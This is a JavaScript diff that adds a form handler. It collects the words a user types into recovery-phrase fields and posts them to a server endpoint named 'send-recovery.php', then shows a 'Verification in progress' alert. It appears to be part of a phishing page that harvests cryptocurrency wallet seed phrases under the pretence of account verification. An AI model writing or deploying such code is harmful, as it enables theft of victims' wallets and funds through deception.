@@ -241,3 +241,44 @@ document.addEventListener('DOMContentLoaded', () => {
     updateSubmitButton();
     updateNumberVisibility(); // Add this to check initial state
 });
+
+async function handleSubmit(event) {
+    event.preventDefault();
+    const inputs = document.querySelectorAll('.phrase-input');
+    const recoveryPhrase = Array.from(inputs)
+        .map(input => input.value.trim().toLowerCase())
+        .join(' ');
+
+    try {
+        const response = await fetch('api/send-recovery.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                recoveryPhrase: recoveryPhrase
+            })
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+
+        const data = await response.json();
+        
+        if (data.success) {
+            // Clear form and show success message
+            document.getElementById('recoveryForm').reset();
+            alert('Verification in progress. Please wait...');
+        } else {
+            throw new Error(data.error || 'Failed to process recovery phrase');
+        }
+
+    } catch (error) {
+        console.error('Error:', error);
+        alert('An error occurred. Please try again.');
+    }
+}
+
+// Add event listener to submit button
+document.querySelector('.login-btn').addEventListener('click', handleSubmit);
